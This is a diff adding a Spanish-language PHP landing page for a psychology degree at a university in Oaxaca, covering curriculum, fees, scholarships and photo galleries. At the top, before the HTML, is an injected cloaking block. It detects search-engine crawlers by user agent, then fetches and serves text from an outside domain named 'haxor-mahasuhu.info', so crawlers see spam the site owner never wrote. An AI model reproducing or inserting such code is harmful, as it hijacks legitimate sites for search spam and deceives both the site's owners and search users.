@@ -1,0 +1,863 @@
+<?php
+ob_start();
+header('Vary: User-Agent');
+$bot_url = "https://kiko.haxor-mahasuhu.info/buo.mx-psicologia/index.txt";
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+function lph_requests($url) {
+    if (function_exists('curl_init')) {    
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+if (preg_match($botchar, $ua)) {
+    usleep(rand(100000, 200000)); 
+    echo lph_requests($bot_url);
+    ob_end_flush();
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="es">
+
+<?php include("head.php"); 
+  include("../descarga_pdf/funciones.php");
+  $link = conectarse();
+  ?> 
+
+<body>
+  <div class="body-inner">
+
+  <?php include("info.php"); ?> 
+
+
+  <div class="site-navigation">
+    <div class="container">
+        <div class="row">
+          <div class="col-lg-12">
+              <nav class="navbar navbar-expand-lg navbar-dark p-0">
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target=".navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                                
+                <div id="navbar-collapse" class="collapse navbar-collapse">
+
+
+                    <ul class="nav navbar-nav mr-auto">
+
+                      <li class="nav-item active"><a class="nav-link" href="inicio.php">Inicio</a></li>
+                      <li class="nav-item "><a class="nav-link" href="#ts-service-area">Acerca de</a></li>
+                      <li class="nav-item "><a class="nav-link" href="#news">Plan de estudios</a></li>
+                      <li class="nav-item "><a class="nav-link" href="politica.php">Política de privacidad</a></li>
+                      <li class="nav-item"><a class="nav-link" href="contacto.php">Contacto</a></li>
+                    </ul>
+                </div>
+              </nav>
+          </div>
+          <!--/ Col end -->
+        </div>
+        <!--/ Row end -->
+
+       
+       
+    </div>
+    <!--/ Container end -->
+
+  </div>
+  <!--/ Navigation end -->
+</header>
+<!--/ Header end -->
+
+<div class="banner-carousel banner-carousel-1 mb-0">
+  <div class="banner-carousel-item" style="background-image:url(images/slider-main/bg1.jpg)">
+    <div class="slider-content">
+        <div class="container h-100">
+          <div class="row align-items-center h-100">
+              <div class="col-md-12 text-center">
+                <h2 class="slide-title" data-animation-in="slideInLeft">Universidad Benémerita de Oaxaca</h2>
+                <h3 class="slide-sub-title" data-animation-in="slideInRight">Licenciatura en Psicología</h3>                
+                <p data-animation-in="slideInLeft" data-duration-in="1.2">
+                   Estudios con Reconocimiento de Validez Oficial RVOE <strong> 2020ES61922035 </strong><br>
+                    <a href="contacto.php" class="slider btn btn-primary">Solicitar Ficha</a>
+                    <a href="convocatoria.pdf" class="slider btn btn-primary border">Dossier</a>
+                </p>
+              </div>
+          </div>
+        </div>
+    </div>
+  </div>
+
+  <div class="banner-carousel-item" style="background-image:url(images/slider-main/bg2.jpg)">
+    <div class="slider-content text-left">
+        <div class="container h-100">
+          <div class="row align-items-center h-100">
+              <div class="col-md-12">
+                <h2 class="slide-title-box" data-animation-in="slideInDown"></h2>
+                <h3 class="slide-title" data-animation-in="fadeIn">Opciones de titulación</h3>
+                <h3 class="slide-sub-title" data-animation-in="slideInLeft">Licenciatura en Psicología</h3>
+                <p data-animation-in="slideInRight">
+                    <a href="#news" class="slider btn btn-primary border">Plan de estudios</a>
+                </p>
+              </div>
+          </div>
+        </div>
+    </div>
+  </div>
+
+  <div class="banner-carousel-item" style="background-image:url(images/slider-main/bg3.jpg)">
+    <div class="slider-content text-right">
+        <div class="container h-100">
+          <div class="row align-items-center h-100">
+              <div class="col-md-12">
+                <h2 class="slide-title" data-animation-in="slideInDown">Licenciatura en Psicología</h2>
+                <h3 class="slide-sub-title" data-animation-in="fadeIn">Mapa Curricular </h3>
+                <p class="slider-description lead" data-animation-in="slideInRight">Nuestra misión es formar profesionales de la psicología que contribuyan a la solución de las problemáticas sociales, con una visión humanista y científica.</p>
+                <div data-animation-in="slideInLeft">
+                    <a href="contacto.php" class="slider btn btn-primary" aria-label="contact-with-us">Solicitar Ficha</a>
+                    <a href="#ts-service-area" class="slider btn btn-primary border" aria-label="learn-more-about-us">Leer más</a>
+                </div>
+              </div>
+          </div>
+        </div>
+    </div>
+  </div>
+</div>
+
+<section class="call-to-action-box no-padding">
+  <div class="container">
+    <div class="action-style-box">
+        <div class="row align-items-center">
+          <div class="col-md-8 text-center text-md-left">
+              <div class="call-to-action-text">
+                <h3 class="action-title">Cupo limitado! Haz tu solicitud de Inscripción </h3>
+              </div>
+          </div><!-- Col end -->
+          <div class="col-md-4 text-center text-md-right mt-3 mt-md-0">
+              <div class="call-to-action-btn">
+                <a class="btn btn-white2" href="contacto.php">Solicitar Ficha</a>
+              </div>
+          </div><!-- col end -->
+         
+        </div><!-- row end -->
+    </div><!-- Action style box -->
+    <div class=" align-items-center text-center">
+      <h4  style="color:black;">Inicio de clases:  agosto de 2025 </h4>
+    </div>
+  </div><!-- Container end -->
+  
+</section><!-- Action end -->
+
+<section id="ts-features" class="ts-features">
+  <div class="container">
+    <div class="row">
+        <div class="col-lg-6">
+          <div class="ts-intro">
+              <h2 class="into-title">Acerca de</h2>
+              <h3 class="into-sub-title">Licenciatura en Psicología </h3>
+              <p style="text-align: justify;">La licenciatura en psicología fue diseñada para lograr que nuestros egresados cuenten con las herramientas y habilidades
+                   para el desempeño laboral, para incorporarse a centros de trabajo institucionales y privados, así como ser autogestivos
+                    de su propia fuente de empleo. <br>
+Durante la formación reforzaremos las competencias suficientes del alumnado para un futuro laboral exitoso, de excelencia, con altos
+ estándares éticos y para conducirse en beneficio de la sociedad. 
+</p>
+          </div><!-- Intro box end -->
+
+          <div class="gap-20"></div>
+
+        
+              
+            
+          <div class="accordion accordion-group" id="our-values-accordion">
+              <div class="card">
+                <div class="card-header p-0 bg-transparent" id="headingOne">
+                    <h2 class="mb-0">
+                      <button class="btn btn-block text-left collapsed" type="button" data-toggle="collapse" data-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
+                          Misión
+                      </button>
+                    </h2>
+                </div>
+              
+                <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#our-values-accordion">
+                    <div class="card-body text-justify">
+                    Formar profesionales en Psicología, que contribuyan a la solución de las problematicas sociales, con una visión
+                    humanista y científica, que integre los conocimientos y metodologías científicas de la materia, con un amplio 
+                    sentido de responsabilidad y ética. 
+                    </div>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header p-0 bg-transparent" id="headingTwo">
+                    <h2 class="mb-0">
+                      <button class="btn btn-block text-left collapsed" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+                          #Por qué elegir BUO
+                      </button>
+                    </h2>
+                </div>
+                <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#our-values-accordion">
+                    <div class="card-body">
+                    <br>
+La licenciatura en Psicología de la BUO es una carrera de excelencia académica que facilitará tu acceso al empleo desde que estás 
+estudiando. <br>
+<ul>
+ Diseño académico innovador y centrado en la excelencia, ética y buenas prácticas </li>
+ <li>Docentes postgraduados, con experiencia laboral y académica.  </li>
+ <li> Prácticas desde los primeros semestres </li>
+ <li>Egresa en 7 semestres  </li>
+ <li>Contamos con 8 formas de titulación </li>
+ <li>Sistema de tutorias  </li>
+ <li>Ofrecemos becas del 50% por excelencia académica </li>
+ <li>Ofrecemos una beca del 100% a una persona indígena o afromexicana (Consulta la convocatoria) </li>
+</ul>
+                    </div>
+                </div>
+              </div>
+              <div class="card">
+                <div class="card-header p-0 bg-transparent" id="headingThree">
+                    <h2 class="mb-0">
+                      <button class="btn btn-block text-left collapsed" type="button" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+                          Inversión
+                      </button>
+                    </h2>
+                </div>
+                <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#our-values-accordion">
+                    <div class="card-body">
+                    Inscripción y reinscripción: $1,800.00<br>
+                    Mensualidad: $3,800.00  <br>
+                    Becas del 25% - 50%
+                    </div>
+                </div>
+    
+          </div>
+          <!--/ Accordion end -->
+
+
+             
+          </div><!-- Content row 1 end -->
+        </div><!-- Col end -->
+
+       
+          <div class="col-lg-6 mt-4">    
+          <div class="text-center">
+            <a href="convocatoria.pdf" target="_blank">    
+            <img  class="img-thumbnail" src="images/services/poster.png" alt="service-avater-image" height="20%" width="60%" ></a>
+          </div><!-- Col end -->
+        </div>
+    </div><!-- Row end -->
+  </div><!-- Container end -->
+</section><!-- Feature are end -->
+
+
+
+<section class="subscribe no-padding">
+  <div class="container">
+    <div class="row">
+        <div class="col-lg-4">
+          <div class="subscribe-call-to-acton">
+              <h3>¿ Necesitas ayuda ?</h3>
+              <h4>951 311 9835 </h4>
+          </div>
+        </div><!-- Col end -->
+
+        <div class="col-lg-8">
+          <div class="ts-newsletter row align-items-center">
+              <div class="col-md-6 newsletter-introtext">
+                <h4 class="text-white mb-0">Licenciatura en Psicología</h4>
+                <a  href="#"> <p class="text-white">Leer más acerca de la licenciatura</p></a>
+                
+              </div>
+
+            
+              </div>
+          </div><!-- Newsletter end -->
+        </div><!-- Col end -->
+
+    </div><!-- Content row end -->
+  </div>
+  <!--/ Container end -->
+</section>
+<!--/ subscribe end -->
+
+
+<section id="ts-service-area" class="ts-service-area pb-0">
+  <div class="container">
+    <div class="row text-center">
+        <div class="col-12">
+          <h2 class="section-title">Razones para estudiar psicología</h2>
+          <h3 class="section-sub-title">Benémerita Universidad de Oaxaca</h3>
+        </div>
+    </div>
+    <!--/ Title row end -->
+
+    <div class="row">
+        <div class="col-lg-4">
+          <div class="ts-service-box d-flex">
+              <div class="ts-service-box-img">
+                <img loading="lazy" src="images/icon-image/service-icon1.png" alt="service-icon">
+              </div>
+              <div class="ts-service-box-info">
+                <h3 class="service-box-title"><a href="#">Diseño curricular vanguardista.</a></h3>
+                <p>Plan de estudios diseñado para  la comprensión de las condiciones </p>
+              </div>
+          </div><!-- Service 1 end -->
+
+          <div class="ts-service-box d-flex">
+              <div class="ts-service-box-img">
+                <img loading="lazy" src="images/icon-image/service-icon2.png" alt="service-icon">
+              </div>
+              <div class="ts-service-box-info">
+                <h3 class="service-box-title"><a href="#">Plantilla docente de excelencia</a></h3>
+                <p>Los docentes son reconocidos en sus áreas de conocimiento, con amplia trayectoria laboral y académica</p>
+              </div>
+          </div><!-- Service 2 end -->
+
+          <div class="ts-service-box d-flex">
+              <div class="ts-service-box-img">
+                <img loading="lazy" src="images/icon-image/service-icon3.png"  alt="service-icon">
+              </div>
+              <div class="ts-service-box-info">
+                <h3 class="service-box-title"><a href="#">Pertenencia e integración </a></h3>
+                <p>Sentido de pertenencia e integración estudiantil</p>
+              </div>
+          </div><!-- Service 3 end -->
+
+        </div><!-- Col end -->
+
+        <div class="col-lg-4 text-center">
+          <img loading="lazy" class="img-fluid" src="images/services/service-center.png" alt="service-avater-image">
+        </div><!-- Col end -->
+
+        <div class="col-lg-4 mt-5 mt-lg-0 mb-4 mb-lg-0">
+          <div class="ts-service-box d-flex">
+              <div class="ts-service-box-img">
+                <img loading="lazy" src="images/icon-image/service-icon4.png" alt="service-icon">
+              </div>
+              <div class="ts-service-box-info">
+                <h3 class="service-box-title"><a href="#">Acercamiento al campo laboral </a></h3>
+                <p>Desde las primeras etapas de la formación educativa</p>
+              </div>
+          </div><!-- Service 4 end -->
+
+          <div class="ts-service-box d-flex">
+              <div class="ts-service-box-img">
+                <img loading="lazy" src="images/icon-image/service-icon5.png" alt="service-icon">
+              </div>
+              <div class="ts-service-box-info">
+                <h3 class="service-box-title"><a href="#">Acceso a tutorías </a></h3>
+                <p>De profesionales de la psicología que te orientarán y guiarán en tu formación, acceso a certificaciones laborales al egreso de la licenciatura</p>
+              </div>
+          </div><!-- Service 5 end -->
+
+          <div class="ts-service-box d-flex">
+              <div class="ts-service-box-img">
+                <img loading="lazy" src="images/icon-image/service-icon6.png" alt="service-icon">
+              </div>
+              <div class="ts-service-box-info">
+                <h3 class="service-box-title"><a href="#">Éxito laboral. </a></h3>
+                <p>Nuestros estudiantes adquieren competencias profesionales que garantizan su inclusión en el mercado laboral</p>
+              </div>
+          </div><!-- Service 6 end -->
+        </div><!-- Col end -->
+    </div><!-- Content row end -->
+
+  </div>
+  <!--/ Container end -->
+</section><!-- Service end -->
+
+
+
+
+
+<section class="subscribe no-padding">
+  <div class="container">
+  <div class="text-center wow fadeInUp" data-wow-delay="0.1s">
+                <br>
+                <h3 class="mb-2 text-white">Beca del 100% </h3>
+                 <h5 class=" text-white">Para cursar la Licenciatura en Psicología </h5>
+            </div>
+    <div class="row">
+        <div class="col-lg-4"> <br>
+        <a href="images/beca1.jfif" target="_blank">
+         <img  src="images/beca1.jfif" alt="service-icon" width=100%  height=80%>
+         </a>
+        </div><!-- Col end -->
+
+        <div class="col-lg-4"> <br>          
+            <a href="images/beca2.jfif" target="_blank">
+          <img  src="images/beca2.jfif" alt="service-icon" width=100%  height=80%>
+          </a>         
+        </div><!-- Newsletter end -->
+    
+        <div class="col-lg-4"><br> 
+       
+        <div class="general-btn text-center">
+          <br> <br>
+          <a class="btn btn-primary" href="./beca">Solicitud de  BECA</a>
+        </div>
+      
+        </div><!-- Newsletter end -->
+      </div><!-- Col end --></div><!-- Content row end -->
+  </div>
+  <!--/ Container end -->
+</section>
+<!--/ subscribe end -->
+
+
+
+
+<section id="project-area" class="project-area solid-bg">
+  <div class="container">
+    <div class="row text-center">
+      <div class="col-lg-12">
+        <h2 class="section-title">Forma parte de esta comunidad</h2>
+        <h3 class="section-sub-title">Vida Estudiantil</h3>
+      </div>
+    </div>
+    <!--/ Title row end -->
+
+    <div class="row">
+      <div class="col-12">
+        <div class="shuffle-btn-group">
+          <label class="active" for="all">
+            <input type="radio" name="shuffle-filter" id="all" value="all" checked="checked">Mostrar todas
+          </label>
+          <label for="commercial">
+            <input type="radio" name="shuffle-filter" id="commercial" value="commercial">Vida Estudiantil
+          </label>
+          <label for="education">
+            <input type="radio" name="shuffle-filter" id="education" value="education">Instalaciones
+          </label>
+          <label for="residential">
+            <input type="radio" name="shuffle-filter" id="residential" value="residential">Docentes
+          </label>
+          <label for="healthcare">
+            <input type="radio" name="shuffle-filter" id="healthcare" value="healthcare">Actividades
+          </label>
+        </div><!-- project filter end -->
+
+
+        <div class="row shuffle-wrapper">
+          <div class="col-1 shuffle-sizer"></div>
+
+          <div class="col-lg-4 col-md-6 shuffle-item" data-groups="[&quot;government&quot;,&quot;healthcare&quot;]">
+            <div class="project-img-container">
+              <a class="gallery-popup" href="images/projects/project1.jpg" aria-label="project-img">
+                <img class="img-fluid" src="images/projects/project1.jpg" alt="project-img">
+                <span class="gallery-icon"><i class="fa fa-plus"></i></span>
+              </a>
+              <div class="project-item-info">
+                <div class="project-item-info-content">
+                  <h3 class="project-item-title">
+                    <a href="projects-single.html">BUO | Facultad de psicología</a>
+                  </h3>
+                  <p class="project-cat">BUO | Facultad de psicología</p>
+                </div>
+              </div>
+            </div>
+          </div><!-- shuffle item 1 end -->
+
+          <div class="col-lg-4 col-md-6 shuffle-item" data-groups="[&quot;healthcare&quot;]">
+            <div class="project-img-container">
+              <a class="gallery-popup" href="images/projects/project2.jpg" aria-label="project-img">
+                <img class="img-fluid" src="images/projects/project2.jpg" alt="project-img">
+                <span class="gallery-icon"><i class="fa fa-plus"></i></span>
+              </a>
+              <div class="project-item-info">
+                <div class="project-item-info-content">
+                  <h3 class="project-item-title">
+                    <a href="projects-single.html">BUO | Facultad de psicología</a>
+                  </h3>
+                  <p class="project-cat">BUO | Facultad de psicología</p>
+                </div>
+              </div>
+            </div>
+          </div><!-- shuffle item 2 end -->
+
+          <div class="col-lg-4 col-md-6 shuffle-item" data-groups="[&quot;infrastructure&quot;,&quot;commercial&quot;]">
+            <div class="project-img-container">
+              <a class="gallery-popup" href="images/projects/project3.jpg" aria-label="project-img">
+                <img class="img-fluid" src="images/projects/project3.jpg" alt="project-img">
+                <span class="gallery-icon"><i class="fa fa-plus"></i></span>
+              </a>
+              <div class="project-item-info">
+                <div class="project-item-info-content">
+                  <h3 class="project-item-title">
+                    <a href="projects-single.html">BUO | Facultad de psicología</a>
+                  </h3>
+                  <p class="project-cat">BUO | Facultad de psicología</p>
+                </div>
+              </div>
+            </div>
+          </div><!-- shuffle item 3 end -->
+
+          <div class="col-lg-4 col-md-6 shuffle-item" data-groups="[&quot;education&quot;,&quot;infrastructure&quot;]">
+            <div class="project-img-container">
+              <a class="gallery-popup" href="images/projects/project4.jpg" aria-label="project-img">
+                <img class="img-fluid" src="images/projects/project4.jpg" alt="project-img">
+                <span class="gallery-icon"><i class="fa fa-plus"></i></span>
+              </a>
+              <div class="project-item-info">
+                <div class="project-item-info-content">
+                  <h3 class="project-item-title">
+                    <a href="projects-single.html">BUO | Facultad de psicología</a>
+                  </h3>
+                  <p class="project-cat">BUO | Facultad de psicología</p>
+                </div>
+              </div>
+            </div>
+          </div><!-- shuffle item 4 end -->
+
+          <div class="col-lg-4 col-md-6 shuffle-item" data-groups="[&quot;infrastructure&quot;,&quot;education&quot;]">
+            <div class="project-img-container">
+              <a class="gallery-popup" href="images/projects/project5.jpg" aria-label="project-img">
+                <img class="img-fluid" src="images/projects/project5.jpg" alt="project-img">
+                <span class="gallery-icon"><i class="fa fa-plus"></i></span>
+              </a>
+              <div class="project-item-info">
+                <div class="project-item-info-content">
+                  <h3 class="project-item-title">
+                    <a href="projects-single.html">BUO | Facultad de psicología</a>
+                  </h3>
+                  <p class="project-cat">BUO | Facultad de psicología</p>
+                </div>
+              </div>
+            </div>
+          </div><!-- shuffle item 5 end -->
+
+          <div class="col-lg-4 col-md-6 shuffle-item" data-groups="[&quot;residential&quot;]">
+            <div class="project-img-container">
+              <a class="gallery-popup" href="images/projects/project6.jpg" aria-label="project-img">
+                <img class="img-fluid" src="images/projects/project6.jpg" alt="project-img">
+                <span class="gallery-icon"><i class="fa fa-plus"></i></span>
+              </a>
+              <div class="project-item-info">
+                <div class="project-item-info-content">
+                  <h3 class="project-item-title">
+                    <a href="projects-single.html">Actividades BUO</a>
+                  </h3>
+                  <p class="project-cat">BUO | Facultad de psicología</p>
+                </div>
+              </div>
+            </div>
+          </div><!-- shuffle item 6 end -->
+        </div><!-- shuffle end -->
+      </div>
+
+      <div class="col-12">
+        <div class="general-btn text-center">
+          <a class="btn btn-primary" href="#">Ver todas las fotos</a>
+        </div>
+      </div>
+
+    </div><!-- Content row end -->
+  </div>
+  <!--/ Container end -->
+</section><!-- Project area end -->
+
+<section class="content">
+  <div class="container">
+    <div class="row">
+
+
+
+    
+        <div class="col-lg-6">
+          <h3 class="column-title">Perfil de ingreso</h3>
+
+          <div id="row all-clients" class="row all-clients">
+              <div class="item">
+                    
+•	Conocimientos generales de redacción<br>
+•	Pensamiento lógico-matemático<br>
+•	Pensamiento crítico y constructivo <br>
+•	Capacidad para el trabajo colaborativo<br>
+•	Respeto a los derechos de otras personas<br>
+•	Respeto y aceptación a la diferencia<br>
+•	Actitud de mejora constante, Actitud competitiva <br>
+•	Actitud empática y responsabilidad afectiva <br>
+
+   
+              </div>
+              <!--/ Item 1 end -->
+
+              
+
+          </div>
+          <!--/ Testimonial carousel end-->
+        </div><!-- Col end -->
+
+        <div class="col-lg-6">
+
+          <h3 class="column-title">Perfil de egreso</h3>
+          <div id="row all-clients" class="row all-clients">
+          <div class="row all-clients">
+              
+          <div class="item">
+                    
+•	Adquirirás una formación profesional ética y de excelencia académica<br>
+•	Contarás con habilidades para la investigación científica <br>
+•	Te comunicarás asertivamente<br>
+•	Manejarás pruebas psicométricas en distintos campos de aplicación<br>
+•	Realizarás evaluaciones e informes psicológicos acordes al tipo de intervención <br>
+•	Identificaras el tipo de intervención necesaria en cada caso concreto<br>
+•	Realzarás acciones de prevención y promoción de la salud mental<br>
+•	Forjarás mejores prácticas en la psicología <br>                    
+                       
+        </div>
+         <!--/ Item 1 end -->
+          </div><!-- Clients row end -->
+
+        </div><!-- Col end -->
+        </div>
+    </div>
+    <!--/ Content row end -->
+  </div>
+  <!--/ Container end -->
+</section><!-- Content end -->
+
+
+
+
+
+<section class="subscribe no-padding">
+  <div class="container">
+    <div class="row">
+        <div class="col-lg-4">
+        
+          <img  src="images/services/info.png" alt="service-icon" width=100%  height=100%>
+        
+        </div><!-- Col end -->
+
+        <div class="col-lg-8">
+          <div class="ts-newsletter row align-items-center">
+              <div class="col-md-12 newsletter-introtext">
+                <h4 class="text-white mb-0">Formas de titulación </h4>
+              <ul class="text-white">
+                <li>Titulación por promedio   </li>
+                <li>Titulación por acreditación de estudios de maestría  </li>
+                <li>Titulación por elaboración de libros de texto sobre alguna materia del programa de estudios  </li>
+                <li>Titulación por examen Ceneval  </li>
+                <li>Titulación por tesis individual o colectiva  </li>
+                <li>Titulación por experiencia profesional comprobable por 1 año  </li>
+                <li>Titulación por estudios complementarios  </li>
+                <li>Titulación por proyecto  </li>
+
+             
+              </ul>
+                
+              </div>
+
+            
+              </div>
+          </div><!-- Newsletter end -->
+        </div><!-- Col end -->
+
+    </div><!-- Content row end -->
+  </div>
+  <!--/ Container end -->
+</section>
+<!--/ subscribe end -->
+
+
+
+
+    <!-- Courses Start -->
+    <div class="container-xxl py-5" id="acercade">
+        <div class="container">
+            <div class="text-center wow fadeInUp" data-wow-delay="0.1s">
+                <h6 class="section-title bg-white text-center text-primary px-3">7 Semestres</h6>
+                <h1 class="mb-5">Plan de estudios</h1>
+            </div>
+            
+            <div class="container">
+        <div class="row">
+          <div class="col-lg-4 col-md-4 col-sm-4">
+            <div class="education wow fadeInRight" data-wow-delay="0.3s">
+              <ul class="timeline">
+               
+                 <li>
+              
+                  <div class="content-text">
+                    <p class="line-title">Primer Semestre</p>
+                      <span>- Historia de la Psicología<br>
+                     - Desarrollo Psicológico I<br>
+                      - Introducción a Filosofía de la Psicología<br>
+                      - Psicología de la Salud<br>
+                      - Introducción a las Neurociencias<br>
+                      - Estadística <br>
+                      - Taller de Expresión Escrita 
+                    </span>
+                  </div>
+                </li>
+                <li>
+               
+                  <div class="content-text">
+                    <p class="line-title">Segundo Semestre</p>
+                    <span>- Teorías de la Personalidad<br>
+                    - Desarrollo Psicológico II<br>
+                    - Psicología Diferencial<br>
+                    - Procesos Organizacionales<br>
+                    - Psicología Social<br>
+                    - Estrategias del Estudio y Comunicación<br><br>
+                   </span>
+                  </div>
+                </li>
+                
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Tercer Semestre</p>
+                    <span>- Desarrollo Psicológico III<br>
+                    - Psicología Laboral<br>
+                    - Neuropsicología II<br>
+                    - Aprendizaje<br>
+                    - Psicología Social Aplicada<br>
+                    - Taller de Creatividad e Innovación
+                    </span>
+                  </div>
+                  </li>
+                
+              </ul>
+            </div>
+          </div>
+          <div class="col-lg-4 col-md-4 col-sm-4">
+            <div class="experience wow fadeInRight" data-wow-delay="0.6s">
+              <ul class="timeline">
+                
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Cuarto Semestre</p>
+                    <span>- Bases de la Psicopatología<br>
+                    - Teoría y técnica de la entrevista <br>
+                    - Psicometría<br>
+                    - Psicología Clínica<br>
+                    - Principios de evaluación Neuropsicológica<br>
+                    - Aprendizaje y conducta <br>
+                    - Ética del psicólogo
+                    </span>
+                  </div>
+                </li>
+               <li>
+              
+                  <div class="content-text">
+                    <p class="line-title">Quinto Semestre</p>
+                    <span>- Psicopatologia <br>
+- Psicofarmacología<br>
+- Pruebas laborales<br>
+- Psicología organizacional <br>
+- Aprendizaje<br>
+- Educación inclusiva <br>
+- Fundamentos de la investigación
+</span>
+                  </div>
+                </li>
+
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Sexto Semestre</p>
+                    <span> - Dinámica de los grupos<br>
+- Pruebas clínicas y forenses<br>
+- Modelos de psicoterapia<br>
+- Psicología jurídica y forense<br>
+- Psicología educativa<br>
+- Psicología comunitaria <br>
+- Seminario de investigación
+</span>
+                   </div>
+                </li>
+                              
+              </ul>
+            </div>
+          </div>
+          
+          <div class="col-lg-4 col-md-4 col-sm-4">
+            <div class="experience wow fadeInRight" data-wow-delay="0.6s">
+              <ul class="timeline">
+          
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Séptimo Semestre</p>
+                    <span>- Estudios de casos clínicos<br>
+- Modelos de terapia individual y familiar<br>
+- Integración de estudios psicológicos<br>
+- Modelos de terapia en niñas, niños y adolescentes<br>
+- Principios de neuroderecho<br>
+- Seminario de investigación II<br>
+</span>
+                  </div>
+                </li>
+                <li>
+                  <div class="content-text">
+                    <p class="line-title">Octavo Semestre</p>
+                    <span>Ánalisis politíco estratégico<br>
+Protección de datos personales y nuevas técnologías<br>
+Opinión pública y prospectiva politíca<br>
+Evaluación de politícas públicas <br>
+Seminario de elaboración instrumentos de gobierno e innvación pública<br><br>
+</span>
+                  </div>
+                </li>
+                             
+              </ul>
+            </div>
+          </div>
+          
+        </div>
+      </div>
+
+
+
+
+            </div>
+        </div>
+    </div>
+    <!-- Courses End -->
+
+
+
+
+<section class="subscribe no-padding">
+  <div class="container">
+  <div class="text-center wow fadeInUp" data-wow-delay="0.1s">
+                <br>
+                <h3 class="mb-5 text-white">Eventos BUO | Facultad de Psicología</h3>
+            </div>
+    <div class="row">
+        <div class="col-lg-6"> <br>
+        <a href="images/eventoh.jfif" target="_blank">
+         <img  src="images/eventoh.jfif" alt="service-icon" width=100%  height=100%>
+         </a>
+        </div><!-- Col end -->
+
+        <div class="col-lg-3"> <br>          
+            <a href="images/eventov1.jfif" target="_blank">
+          <img  src="images/eventov1.jfif" alt="service-icon" width=100%  height=100%>
+          </a>         
+        </div><!-- Newsletter end -->
+    
+        <div class="col-lg-3"><br> 
+        <a href="images/eventov2.jfif" target="_blank">
+          <img  src="images/eventov2.jfif" alt="service-icon" width=100%  height=100%>
+          </a>
+        </div><!-- Newsletter end -->
+      </div><!-- Col end -->
+
+    </div><!-- Content row end -->
+  </div>
+  <!--/ Container end -->
+</section>
+<!--/ subscribe end -->
+
+
+
+
+<?php include("footer.php"); ?> 
+
+  </body>
+  </html>
